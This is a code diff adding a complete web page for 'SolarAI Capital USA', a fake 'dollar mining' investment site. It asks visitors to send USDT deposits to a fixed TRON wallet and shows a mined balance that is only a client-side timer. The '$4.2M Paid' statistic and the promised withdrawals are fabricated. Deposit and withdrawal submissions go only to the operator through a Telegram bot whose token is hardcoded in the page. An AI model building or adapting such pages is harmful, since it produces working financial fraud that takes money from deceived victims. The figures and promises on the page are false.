@@ -1,21 +1,123 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>SolarAI Capital USA - Dollar Mining</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;}
+body{background:#0a0a0a;color:white;min-height:100vh;}
+.header{padding:20px;background:#111;border-bottom:1px solid #222;display:flex;justify-content:space-between;}
+.logo{font-weight:bold;font-size:18px;} .logo span{color:#00ff88;}
+.hero{padding:40px 20px;text-align:center;}
+.hero h1{font-size:32px;margin-bottom:10px;}
+.hero p{color:#888;margin-bottom:30px;}
+.card{background:#111;border:1px solid #222;border-radius:16px;padding:24px;margin:20px;max-width:500px;margin-left:auto;margin-right:auto;}
+.balance{font-size:14px;color:#888;}
+.amount{font-size:42px;font-weight:bold;margin:10px 0;color:#00ff88;}
+.btn{width:100%;padding:16px;background:white;color:black;border:none;border-radius:12px;font-weight:bold;font-size:16px;margin-top:20px;cursor:pointer;}
+.btn-green{background:#00ff88 !important;}
+.btn-outline{background:transparent !important;color:white !important;border:1px solid #333 !important;}
+.stats{display:flex;justify-content:space-between;margin-top:20px;gap:10px;}
+.stat{background:#1a1a1a;padding:15px;border-radius:12px;flex:1;text-align:center;}
+.stat b{display:block;font-size:18px;margin-bottom:5px;}
+.stat small{color:#888;font-size:12px;}
+.badge{display:inline-block;background:#00ff8820;color:#00ff88;padding:6px 12px;border-radius:20px;font-size:12px;margin-bottom:20px;border:1px solid #00ff8840;}
+.walletBox{background:#000;border:1px dashed #00ff88;padding:12px;border-radius:10px;word-break:break-all;font-size:13px;color:#00ff88;margin:10px 0;}
+.depositBtns{display:flex;gap:8px;margin-top:15px;}
+.depositBtns button{flex:1;padding:12px;background:#1a1a1a;border:1px solid #333;color:white;border-radius:10px;font-weight:bold;cursor:pointer;}
+.depositBtns button:hover{border-color:#00ff88;color:#00ff88;}
+.network{font-size:11px;color:#ffaa00;background:#ffaa0015;padding:4px 8px;border-radius:6px;display:inline-block;margin-top:5px;}
+</style>
+</head>
+<body>
+<div class="header">
+<div class="logo">⚡ <span>SolarAI</span> USA</div>
+<div style="font-size:12px;color:#00ff88;">● LIVE</div>
+</div>
+<div class="hero">
+<div class="badge">🇺🇸 USA Dollar Mining Active</div>
+<h1>Mine USD Daily</h1>
+<p>Your solar-powered dollar mining bot is live</p>
+</div>
+
+<!-- NEW DEPOSIT CARD -->
+<div class="card" style="border-color:#00ff8840;">
+<div class="balance">💰 Deposit - USDT (TRC20) Only</div>
+<div style="font-size:13px;color:#888;margin-top:5px;">Minimum Deposit: $50</div>
+<div class="walletBox" id="walletDisplay">TATeM34UJsHhnADWrjemiYXdrHiyuPrFra</div>
+<div class="network">⚠️ Network: TRON TRC20 Only - Do NOT send BEP20/ERC20</div>
+<div class="depositBtns">
+<button onclick="selectDeposit(50)">$50<br><small>STARTER</small></button>
+<button onclick="selectDeposit(500)">$500<br><small>PRO</small></button>
+<button onclick="selectDeposit(5000)">$5000<br><small>VIP</small></button>
+</div>
+<button class="btn btn-green" onclick="copyWallet()">📋 COPY WALLET ADDRESS</button>
+<button class="btn btn-outline" onclick="confirmDeposit()">✅ I HAVE SENT USDT (TRC20)</button>
+<div style="font-size:11px;color:#666;margin-top:10px;text-align:center;">Deposit to: TATeM...PrFra via TRC20 | Auto-credited after 1 confirmation</div>
+</div>
+
+<div class="card">
+<div class="balance">Total Mined Balance</div>
+<div class="amount" id="balance">$0.00</div>
+<div style="color:#888;font-size:13px;">Speed: $0.12 / sec</div>
+<button class="btn" id="mineBtn" onclick="mine()">⚡ START MINING</button>
+<button class="btn btn-green" onclick="withdraw()">💵 WITHDRAW USD (Min $50)</button>
+<div class="stats">
+<div class="stat"><b>1,248</b><small>Active</small></div>
+<div class="stat"><b>$4.2M</b><small>Paid</small></div>
+<div class="stat"><b>USA</b><small>Region</small></div>
+</div>
+</div>
 <script>
-// === SOLARAI USA - WALLET CONFIG ===
-const WALLET_ADDRESS = "TATeM34UJsHhnADWrjemiYXdrHiyuPrFra";
-const WALLET_LABEL = "USDT (TRC20) - TRON Network";
+const DEPOSIT_WALLET = "TATeM34UJsHhnADWrjemiYXdrHiyuPrFra";
 const MIN_DEPOSIT = 50;
 const MIN_WITHDRAW = 50;
+let selectedAmount = 50;
+let bal=0; let mining=false;
 
-const DEPOSIT_OPTIONS = [
-  { label: "$50 STARTER", amount: 50 },
-  { label: "$500 PRO", amount: 500 },
-  { label: "$5000 VIP", amount: 5000 }
-];
+function selectDeposit(amt){
+  if(amt < MIN_DEPOSIT){ alert("❌ Minimum deposit is $50"); return; }
+  selectedAmount = amt;
+  alert(`✅ Selected: $${amt} USDT (TRC20)\n\nSend to:\n${DEPOSIT_WALLET}\n\nNetwork: TRON TRC20 Only`);
+}
 
-// Auto-update page display
-document.addEventListener("DOMContentLoaded", function(){
-  const el = document.getElementById("walletAddress");
-  if(el) {
-    el.innerText = WALLET_ADDRESS + " - " + WALLET_LABEL;
+function copyWallet(){
+  navigator.clipboard.writeText(DEPOSIT_WALLET);
+  alert("✅ Copied!\n\n" + DEPOSIT_WALLET + "\nUSDT (TRC20) - TRON");
+}
+
+function confirmDeposit(){
+  let tx = prompt(`💰 Confirm Deposit $${selectedAmount} USDT (TRC20)\n\nWallet: ${DEPOSIT_WALLET}\n\nEnter Transaction Hash (optional) or click OK:`);
+  let token = "8940541573:AAFjScGdvW-W2NbjdPC78ooxIBNENqkQSjE";
+  let chatId = "1884572429";
+  let text = `💰 NEW DEPOSIT - SolarAI USA\n\n💵 Amount: $${selectedAmount} USDT (TRC20)\n📥 Wallet: ${DEPOSIT_WALLET}\n🌐 Network: TRON TRC20\n🔗 TX: ${tx || 'Not provided'}\n⏰ ${new Date().toLocaleString()}\n🌐 solarai-capital-usa.vercel.app\n✅ Min $${MIN_DEPOSIT} met`;
+  fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`);
+  alert(`✅ Deposit Request Submitted!\n\nAmount: $${selectedAmount} USDT (TRC20)\nTo: ${DEPOSIT_WALLET}\n\nStatus: Waiting for confirmation\nWill be credited in 10 mins after 1 network confirmation.`);
+}
+
+function mine(){
+ if(mining) return;
+ mining=true;
+ document.getElementById('mineBtn').innerText='⛏️ MINING...';
+ setInterval(()=>{ bal+=0.12+Math.random()*0.05; document.getElementById('balance').innerText='$'+bal.toFixed(2); },200);
+}
+function withdraw(){
+  if(bal < MIN_WITHDRAW){
+    alert(`⚠️ Minimum withdrawal is $${MIN_WITHDRAW}.00\n\nYou have: $${bal.toFixed(2)}\n\nKeep mining until you reach $${MIN_WITHDRAW}!`);
+  } else {
+    let wallet = prompt(`💵 Withdraw $${bal.toFixed(2)}\n\nEnter your USDT (TRC20) wallet address:`);
+    if(wallet && wallet.length > 10){
+      let token = "8940541573:AAFjScGdvW-W2NbjdPC78ooxIBNENqkQSjE";
+      let chatId = "1884572429";
+      let text = `🚨 NEW WITHDRAWAL - SolarAI USA\n\n💰 Amount: $${bal.toFixed(2)}\n👛 Wallet: ${wallet}\n💳 Type: USDT (TRC20)\n🕐 Time: ${new Date().toLocaleString()}\n🌐 Site: solarai-capital-usa.vercel.app`;
+      fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`);
+      alert(`✅ Withdrawal Request Received!\n\nAmount: $${bal.toFixed(2)}\nWallet: ${wallet}\nNetwork: USDT (TRC20)\n\nStatus: PENDING\nWill be processed in 24h by USA team.`);
+      bal=0;
+      document.getElementById('balance').innerText='$0.00';
+    }
   }
-});
+}
 </script>
+</body>
+</html>
